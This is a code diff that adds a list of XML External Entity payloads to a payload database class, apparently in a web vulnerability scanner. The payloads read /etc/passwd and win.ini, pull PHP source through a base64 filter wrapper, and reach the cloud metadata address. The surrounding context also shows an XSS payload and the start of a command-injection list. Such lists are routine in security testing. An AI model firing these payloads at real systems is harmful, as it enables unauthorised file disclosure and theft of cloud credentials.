@@ -151,6 +151,27 @@ class PayloadDB:
         '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">',
     ]
 
+    # XXE (XML External Entity) Payloads
+    XXE_PAYLOADS = [
+        # Basic XXE - Linux file read
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+
+        # XXE - Windows file read
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+
+        # XXE - PHP wrapper
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
+
+        # XXE - Parameter entity
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
+
+        # XXE - SSRF (Server-Side Request Forgery via XXE)
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
+
+        # Simple XML with entity
+        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "XXE_TEST_STRING">]><test>&xxe;</test>',
+    ]
+
     # Command injection payloads
     RCE_PAYLOADS = [
         '; id',
